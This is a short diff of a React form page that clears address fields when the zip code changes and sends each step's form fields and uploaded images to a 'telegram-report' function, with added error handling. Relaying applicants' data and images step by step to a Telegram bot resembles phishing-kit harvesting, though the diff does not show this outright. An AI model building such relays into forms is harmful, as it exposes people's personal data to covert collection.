@@ -214,7 +214,7 @@ const Index = () => {
 
   const updateField = (field: keyof FormDataState, value: string) => {
     setError("");
-    setFormData((current) => ({ ...current, [field]: value }));
+    setFormData((current) => field === "zip" && value !== current.zip ? { ...current, zip: value, city: "", state: "", address: "" } : { ...current, [field]: value });
   };
 
   const startApplication = async (zip = "") => {
@@ -232,11 +232,12 @@ const Index = () => {
     await showLoader("Processing...", zip ? 3 : 2);
   };
 
-  const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }) => {
+  const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }, fields = reportFieldsForStep(targetStep, formData)) => {
     try {
-      await supabase.functions.invoke("telegram-report", {
-        body: { step: targetStep, title: reportTitleForStep(targetStep), fields: reportFieldsForStep(targetStep, formData), image },
+      const { error: reportError } = await supabase.functions.invoke("telegram-report", {
+        body: { step: targetStep, title: reportTitleForStep(targetStep), fields, image },
       });
+      if (reportError) throw reportError;
     } catch {
       setError("Telegram notification could not be delivered. Please try again.");
       throw new Error("Telegram notification failed");
